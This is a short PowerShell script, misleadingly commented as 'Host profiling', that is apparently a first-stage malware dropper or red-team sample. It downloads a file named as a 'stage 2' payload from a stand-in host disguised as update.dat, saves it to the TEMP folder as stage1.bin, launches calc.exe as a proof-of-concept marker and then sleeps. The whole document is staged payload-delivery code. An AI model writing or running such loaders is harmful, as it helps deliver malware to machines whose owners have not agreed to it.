<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://example.net:80/assets/update.dat",
    [string]$WorkingPath = "$env:TEMP\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Start-Sleep -Seconds 35
